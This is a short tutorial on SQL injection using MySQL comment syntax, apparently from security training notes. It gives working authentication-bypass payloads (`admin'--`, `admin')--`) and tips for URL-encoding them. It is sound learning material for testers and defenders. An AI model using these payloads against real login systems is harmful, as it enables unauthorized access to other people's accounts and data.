# SQL Injection Using Comments

SQL comments can be a powerful tool for manipulating queries, particularly in the context of SQL injection attacks. By using comments, an attacker can alter the logic of a query to bypass authentication mechanisms. Understanding how to effectively use comments, such as `--` and `#`, allows for the creation of malicious inputs that can lead to unauthorized access. This technique highlights the importance of secure coding practices and the need for robust input validation in database-driven applications.

**Comments in SQL**

* SQL supports comments to document queries or ignore parts of them.
* Two types of line comments in MySQL:
  * `--` (must be followed by a space)
  * `#` (can be used for single-line comments)
  * In-line comments: `/* comment */` (less common in SQL injections)

**Example of Using Comments:**

```sql
SELECT username FROM logins; -- This selects usernames from the logins table
```

**Important Note on Comments**

* The `--` comment must have a space after it to be recognized.
* In URLs, spaces are encoded as `+`, so `--` can be represented as `--+`.
* The `#` symbol is treated as a tag in URLs; use `%23` to encode it.

**Example with `#`:**

```sql
SELECT * FROM logins WHERE username = 'admin'; # This part is ignored
```

**Authentication Bypass**

* To bypass authentication, inject `admin'--` as the username.
* The modified query becomes:

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```

* The query checks only for the username, ignoring the password condition.

**Example of Bypassing with Parentheses**

* SQL allows parentheses to prioritize conditions.
* If a query checks for `id > 1`, it prevents logging in as admin if the admin's ID is 1.
* Attempting to log in with valid credentials fails if the ID is 1.

**Example of Failed Login:**

```sql
SELECT * FROM logins WHERE (username='admin' AND id > 1);
```

* To bypass this, use `admin')--` to close the parentheses and comment out the rest:

```sql
SELECT * FROM logins WHERE (username='admin')-- ' AND password = 'something';
```

* This successfully logs in as admin.

